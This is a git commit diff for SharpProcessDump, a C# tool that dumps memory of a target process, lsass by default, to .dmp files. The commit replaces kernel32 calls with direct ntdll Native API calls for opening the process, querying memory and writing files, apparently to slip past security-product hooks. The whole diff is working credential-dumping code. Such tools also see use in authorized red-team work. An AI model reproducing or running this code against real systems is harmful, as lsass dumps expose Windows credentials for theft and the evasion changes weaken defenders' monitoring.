57568e499a9e15660b692512d84bd3660e6cbea5
Ricardo Ruiz <ricardojruiz93@gmail.com>
2024-02-15 11:56:01 +0100

    Add files via upload

--- SharpProcessDump/Program.cs
+++ SharpProcessDump/Program.cs
@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 using static SharpProcessDump.Win32;
 
 
@@ -7,38 +8,62 @@ namespace SharpProcessDump
 {
     internal class Program
     {
-        public const int MEM_COMMIT = 0x00001000;
-        public const int PAGE_READWRITE = 0x04;
-        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
-        public const uint PROCESS_VM_READ = 0x0010;
-        public const int MAXIMUM_ALLOWED = 0x02000000;
-        public const uint GENERIC_ALL = 0x10000000;
-        public const uint FILE_SHARE_WRITE = 0x00000002;
-        public const uint CREATE_ALWAYS = 2;
-        public const uint FILE_ATTRIBUTE_NORMAL = 128;
-
-
         static void WriteToFile(byte[] buffer, int bufferSize, string filename)
         {
+            // Create to file
+            IntPtr hFile;
+            UNICODE_STRING fname = new UNICODE_STRING();
+            string current_dir = System.IO.Directory.GetCurrentDirectory();
+            RtlInitUnicodeString(out fname, @"\??\" + current_dir + "\\" + filename);
+            IntPtr objectName = Marshal.AllocHGlobal(Marshal.SizeOf(fname));
+            Marshal.StructureToPtr(fname, objectName, true);
+            OBJECT_ATTRIBUTES FileObjectAttributes = new OBJECT_ATTRIBUTES
+            {
+                Length = (int)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
+                RootDirectory = IntPtr.Zero,
+                ObjectName = objectName,
+                Attributes = OBJ_CASE_INSENSITIVE,
+                SecurityDescriptor = IntPtr.Zero,
+                SecurityQualityOfService = IntPtr.Zero
+            };
+            IO_STATUS_BLOCK IoStatusBlock = new IO_STATUS_BLOCK();
+            long allocationSize = 0;
+            uint ntstatus = NtCreateFile(
+                out hFile,
+                FileAccess_FILE_GENERIC_WRITE,
+                ref FileObjectAttributes,
+                ref IoStatusBlock,
+                ref allocationSize,
+                FileAttributes_Normal, // 0x80 = 128 https://learn.microsoft.com/es-es/dotnet/api/system.io.fileattributes?view=net-7.0
+                FileShare_Write, // 2 - https://learn.microsoft.com/en-us/dotnet/api/system.io.fileshare?view=net-8.0
+                CreationDisposition_FILE_OVERWRITE_IF, // 5 - https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
+                CreateOptionFILE_SYNCHRONOUS_IO_NONALERT, // 32 -  https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
+                IntPtr.Zero,
+                0
+            );
+            if (ntstatus != 0) {
+                Console.WriteLine("[-] Calling NtOpenFile failed.");
+                Environment.Exit(0);
+            }
+
             // Write to file
-            IntPtr hFile = CreateFileA(filename, GENERIC_ALL, FILE_SHARE_WRITE, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-            WriteFile(hFile, buffer, (uint)bufferSize, out _, IntPtr.Zero);
+            ntstatus = NtWriteFile(hFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref IoStatusBlock, buffer, (uint)bufferSize, IntPtr.Zero, IntPtr.Zero);
+            if (ntstatus != 0)
+            {
+                Console.WriteLine("[-] Calling NtWriteFile failed.");
+                Environment.Exit(0);
+            }
         }
 
 
         static void Main(string[] args)
         {
-            // Get process and file name
+            // Get process name
             string procname = "lsass";
-            string dumpfile = "dump.dmp";
             if (args.Length > 0) { 
                 procname = args[0];
             }
-            if (args.Length > 1)
-            {
-                dumpfile = args[1];
-            }
-            Console.WriteLine("[+] Dumping " + procname + " to file " + dumpfile);
+            Console.WriteLine("[+] Dumping " + procname);
 
             //Get process PID
             Process[] process_list = Process.GetProcessesByName(procname);
@@ -50,12 +75,17 @@ namespace SharpProcessDump
             int processPID = process_list[0].Id;
             Console.WriteLine("[+] Process PID: " + processPID);
 
-            // OpenProcess
-            IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, processPID);
+            // Get process handle with NtOpenProcess
+            IntPtr processHandle = IntPtr.Zero;
+            CLIENT_ID client_id = new CLIENT_ID();
+            client_id.UniqueProcess = (IntPtr)processPID;
+            client_id.UniqueThread = IntPtr.Zero;
+            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
+            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
             Console.WriteLine("[+] Process handle: " + processHandle);
             if (processHandle == IntPtr.Zero)
             {
-                Console.WriteLine("[-] OpenProcess failed. Do you have enough privileges for this process?");
+                Console.WriteLine("[-] NtOpenProcess failed. Do you have enough privileges for this process?");
                 Environment.Exit(0);
             }
 
@@ -65,9 +95,9 @@ namespace SharpProcessDump
             byte[] aux_bytearray = {};
             while ((long)aux_address < proc_max_address_l)
             {
-                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx
+                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx/NtQueryVirtualMemory
                 MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
-                int res = VirtualQueryEx(processHandle, (IntPtr)aux_address, out mbi, 0x30); // (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
+                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)aux_address, MemoryBasicInformation, out mbi, 0x30, out _);
 
                 // If readable and commited --> Write memory region to a file
                 if (mbi.Protect == PAGE_READWRITE && mbi.State == MEM_COMMIT)
@@ -78,13 +108,20 @@ namespace SharpProcessDump
                     string memdump_filename = procname + "_" + processPID + "_0x" + aux_address.ToString("X") + ".dmp";
                     WriteToFile(buffer, (int)mbi.RegionSize, memdump_filename);
                     byte[] new_bytearray = new byte[aux_bytearray.Length + buffer.Length];
-                    System.Buffer.BlockCopy(aux_bytearray, 0, new_bytearray, 0, aux_bytearray.Length);
-                    System.Buffer.BlockCopy(buffer, 0, new_bytearray, aux_bytearray.Length, buffer.Length);
+                    Buffer.BlockCopy(aux_bytearray, 0, new_bytearray, 0, aux_bytearray.Length);
+                    Buffer.BlockCopy(buffer, 0, new_bytearray, aux_bytearray.Length, buffer.Length);
                     aux_bytearray = new_bytearray;
                 }
 
                 // Next memory region
                 aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
+            }
+
+            // Get file name
+            string dumpfile = procname + "_" + processPID + "_allinone.dmp";
+            if (args.Length > 1)
+            {
+                dumpfile = args[1];
             }
 
             // Dump all byte arrays to one single file
--- SharpProcessDump/Win32.cs
+++ SharpProcessDump/Win32.cs
@@ -6,11 +6,32 @@ namespace SharpProcessDump
 {
     internal class Win32
     {
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr OpenProcess(
-            uint processAccess,
-            bool bInheritHandle,
-            int processId);
+        ///////////////// CONSTANTS /////////////////
+        public const int MEM_COMMIT = 0x00001000;
+        public const int PAGE_READWRITE = 0x04;
+        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
+        public const uint PROCESS_VM_READ = 0x0010;
+        public const int MAXIMUM_ALLOWED = 0x02000000;
+        public const uint GENERIC_ALL = 0x10000000;
+        public const uint FILE_SHARE_WRITE = 0x00000002;
+        public const uint CREATE_ALWAYS = 2;
+        public const uint FILE_ATTRIBUTE_NORMAL = 128;
+        public const uint MemoryBasicInformation = 0;
+        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
+        public const uint FileAccess_FILE_GENERIC_WRITE = 0x120116;
+        public const uint FileAttributes_Normal = 128;
+        public const uint FileShare_Write = 2;
+        public const uint CreationDisposition_FILE_OVERWRITE_IF = 5;
+        public const uint CreateOptionFILE_SYNCHRONOUS_IO_NONALERT = 32;
+
+
+        ///////////////// FUNCTIONS /////////////////
+        [DllImport("ntdll.dll")]
+        public static extern uint NtOpenProcess(
+            ref IntPtr ProcessHandle,
+            uint DesiredAccess,
+            ref OBJECT_ATTRIBUTES ObjectAttributes,
+            ref CLIENT_ID processId);
 
         [DllImport("ntdll.dll")]
         public static extern bool NtReadVirtualMemory(
@@ -20,17 +41,58 @@ namespace SharpProcessDump
             int dwSize,
             out IntPtr lpNumberOfBytesRead);
 
-        [DllImport("kernel32.dll")]
-        public static extern int VirtualQueryEx(
+        [DllImport("ntdll.dll")]
+        public static extern uint NtQueryVirtualMemory(
             IntPtr hProcess,
             IntPtr lpAddress,
-            out MEMORY_BASIC_INFORMATION lpBuffer,
-            uint dwLength);
+            uint MemoryInformationClass,
+            out MEMORY_BASIC_INFORMATION MemoryInformation,
+            uint MemoryInformationLength,
+            out uint ReturnLength);
+
+        [DllImport("ntdll.dll")]
+        public static extern void RtlInitUnicodeString(
+           out UNICODE_STRING DestinationString,
+           [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtCreateFile(
+          out IntPtr FileHadle,
+          uint DesiredAcces,
+          ref OBJECT_ATTRIBUTES ObjectAttributes,
+          ref IO_STATUS_BLOCK IoStatusBlock,
+          ref long AllocationSize,
+          uint FileAttributes,
+          uint ShareAccess,
+          uint CreateDisposition,
+          uint CreateOptions,
+          IntPtr EaBuffer,
+          uint EaLength
+        );
+
+        [DllImport("ntdll.dll")]
+        public static extern uint NtWriteFile(
+            IntPtr FileHandle,
+            IntPtr Event,
+            IntPtr ApcRoutine,
+            IntPtr ApcContext,
+            ref IO_STATUS_BLOCK IoStatusBlock,
+            byte[] Buffer,
+            uint Length,
+            IntPtr ByteOffset,
+            IntPtr Key
+            );
+
+        /*
+        [DllImport("kernel32.dll")]
+        static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr CreateFileA(
-            string lpFileName, uint dwDesiredAccess,
-            uint dwShareMode, IntPtr lpSecurityAttributes,
+            string lpFileName,
+            uint dwDesiredAccess,
+            uint dwShareMode,
+            IntPtr lpSecurityAttributes,
             uint dwCreationDisposition,
             uint dwFlagsAndAttributes,
             IntPtr hTemplateFile);
@@ -42,6 +104,8 @@ namespace SharpProcessDump
             uint nNumberOfBytesToWrite,
             out uint lpNumberOfBytesWritten,
             IntPtr lpOverlapped);
+        */
+
 
         ///////////////// STRUCTS /////////////////
         public struct MEMORY_BASIC_INFORMATION
@@ -53,6 +117,39 @@ namespace SharpProcessDump
             public int State;
             public int Protect;
             public int Type;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct CLIENT_ID
+        {
+            public IntPtr UniqueProcess;
+            public IntPtr UniqueThread;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 0)]
+        public struct OBJECT_ATTRIBUTES
+        {
+            public int Length;
+            public IntPtr RootDirectory;
+            public IntPtr ObjectName;
+            public uint Attributes;
+            public IntPtr SecurityDescriptor;
+            public IntPtr SecurityQualityOfService;
+        }
+
+
+        [StructLayout(LayoutKind.Sequential, Pack = 0)]
+        public struct IO_STATUS_BLOCK
+        {
+            public uint status;
+            public IntPtr information;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 0)]
+        public struct UNICODE_STRING {
+            public ushort Length;
+            public ushort MaximumLength;
+            public IntPtr Buffer;
         }
 
         /*
@@ -70,9 +167,150 @@ namespace SharpProcessDump
             public ushort processorLevel;
             public ushort processorRevision;
         }
+        */
 
-        [DllImport("kernel32.dll")]
-        static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);
+
+        /* // Source: https://jhalon.github.io/utilizing-syscalls-in-csharp-2/
+        ///////////////// STRUCTS /////////////////
+
+        [Flags]
+        public enum FileAccess : uint
+        {
+            AccessSystemSecurity = 0x1000000,
+            MaximumAllowed = 0x2000000,
+
+            Delete = 0x10000,
+            ReadControl = 0x20000,
+            WriteDAC = 0x40000,
+            WriteOwner = 0x80000,
+            Synchronize = 0x100000,
+
+            StandardRightsRequired = 0xF0000,
+            StandardRightsRead = ReadControl,
+            StandardRightsWrite = ReadControl,
+            StandardRightsExecute = ReadControl,
+            StandardRightsAll = 0x1F0000,
+            SpecificRightsAll = 0xFFFF,
+
+            FILE_READ_DATA = 0x0001,
+            FILE_LIST_DIRECTORY = 0x0001,
+            FILE_WRITE_DATA = 0x0002,
+            FILE_ADD_FILE = 0x0002,
+            FILE_APPEND_DATA = 0x0004,
+            FILE_ADD_SUBDIRECTORY = 0x0004,
+            FILE_CREATE_PIPE_INSTANCE = 0x0004,
+            FILE_READ_EA = 0x0008,
+            FILE_WRITE_EA = 0x0010,
+            FILE_EXECUTE = 0x0020,
+            FILE_TRAVERSE = 0x0020,
+            FILE_DELETE_CHILD = 0x0040,
+            FILE_READ_ATTRIBUTES = 0x0080,
+            FILE_WRITE_ATTRIBUTES = 0x0100,
+
+            GenericRead = 0x80000000,
+            GenericWrite = 0x40000000,
+            GenericExecute = 0x20000000,
+            GenericAll = 0x10000000,
+
+            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
+            FILE_ALL_ACCESS =
+            StandardRightsRequired |
+            Synchronize |
+            0x1FF,
+
+            FILE_GENERIC_READ = StandardRightsRead |
+                FILE_READ_DATA |
+                FILE_READ_ATTRIBUTES |
+                FILE_READ_EA |
+                Synchronize,
+
+            FILE_GENERIC_WRITE = StandardRightsWrite |
+                FILE_WRITE_DATA |
+                FILE_WRITE_ATTRIBUTES |
+                FILE_WRITE_EA |
+                FILE_APPEND_DATA |
+                Synchronize,
+
+            FILE_GENERIC_EXECUTE = StandardRightsExecute |
+              FILE_READ_ATTRIBUTES |
+              FILE_EXECUTE |
+              Synchronize
+        }
+
+        [Flags]
+        public enum FileShare : uint
+        {
+            None = 0x00000000,
+            Read = 0x00000001,
+            Write = 0x00000002,
+            Delete = 0x00000004
+        }
+
+        [Flags]
+        internal enum CreationDisposition : uint
+        {
+            FILE_SUPERSEDE = 0,
+            FILE_OPEN = 1,
+            FILE_CREATE = 2,
+            FILE_OPEN_IF = 3,
+            FILE_OVERWRITE = 4,
+            FILE_OVERWRITE_IF = 5
+        }
+
+        [Flags]
+        public enum CreateOption : uint
+        {
+            FILE_WRITE_THROUGH = 0x00000002,
+            FILE_SEQUENTIAL_ONLY = 0x00000004,
+            FILE_NO_INTERMEDIATE_BUFFERING = 0x00000008,
+            FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020,
+            FILE_RANDOM_ACCESS = 0x00000800
+        }
+
+        [Flags]
+        public enum FileAttributes : uint
+        {
+            ReadOnly = 0x00000001,
+            Hidden = 0x00000002,
+            System = 0x00000004,
+            Directory = 0x00000010,
+            Archive = 0x00000020,
+            Device = 0x00000040,
+            Normal = 0x00000080,
+            Temporary = 0x00000100,
+            SparseFile = 0x00000200,
+            ReparsePoint = 0x00000400,
+            Compressed = 0x00000800,
+            Offline = 0x00001000,
+            NotContentIndexed = 0x00002000,
+            Encrypted = 0x00004000,
+            Write_Through = 0x80000000,
+            Overlapped = 0x40000000,
+            NoBuffering = 0x20000000,
+            RandomAccess = 0x10000000,
+            SequentialScan = 0x08000000,
+            DeleteOnClose = 0x04000000,
+            BackupSemantics = 0x02000000,
+            PosixSemantics = 0x01000000,
+            OpenReparsePoint = 0x00200000,
+            OpenNoRecall = 0x00100000,
+            FirstPipeInstance = 0x00080000
+        }
+
+        public enum AllocationProtect : uint
+        {
+            PAGE_EXECUTE = 0x00000010,
+            PAGE_EXECUTE_READ = 0x00000020,
+            PAGE_EXECUTE_READWRITE = 0x00000040,
+            PAGE_EXECUTE_WRITECOPY = 0x00000080,
+            PAGE_NOACCESS = 0x00000001,
+            PAGE_READONLY = 0x00000002,
+            PAGE_READWRITE = 0x00000004,
+            PAGE_WRITECOPY = 0x00000008,
+            PAGE_GUARD = 0x00000100,
+            PAGE_NOCACHE = 0x00000200,
+            PAGE_WRITECOMBINE = 0x00000400
+        }
         */
     }
 }
